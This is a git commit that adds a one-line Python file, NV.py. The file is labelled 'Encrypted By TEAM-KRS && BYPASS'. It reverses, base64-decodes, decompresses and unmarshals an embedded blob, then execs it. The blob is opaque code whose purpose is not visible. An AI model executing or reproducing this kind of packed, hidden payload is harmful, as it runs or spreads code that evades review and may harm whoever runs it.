fb0985dfe6af74cfff23b8f8059dc52fabec7bbb
KASHIF KHAN <102716348+TEAM-KRS@users.noreply.github.com>
2022-07-15 15:54:05 +0500

    Create NV.py

---
+++ NV.py
@@ -0,0 +1,3 @@
+# Encrypted By TEAM-KRS && BYPASS
+
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=AIaMW7XYeX3h3D7mJ4KzTzkP6mzEa/77iP5VHKzf9Zs7isoDsdr6KtMhe0YBrHxu8lK2UJ2zTBYEoa2knn4eNqEKomxQKMlu+SUyEPUlC/th/xC1+6vkI0xcLhC+TwiDpUA5TFHk8CvkhATAVaOnB60t1+0TkZhl/weGhqPybAxxdhMjHtSrrxItfWGdnMfMSi9A3klnADPNmF1DnOzla5PpUfxgRHcnDW7OqSlIknaOLTYR0TFWsXRirP1tMpLpVX+fEsu7jUALyoDR9DoX3w0Lzk0eUHKsUHxCEa2DIEFAR8Dok20Rfq8tqLZsg/ys8aZz5TsGESz7gSb45m1/Hz4KHnbztTmMFRSS+pk8rZ/p1VEBcxaLjgMoJxKiwDiYD1EoqdC1sAH3QPpTFURAAkgytLkdxJe'))
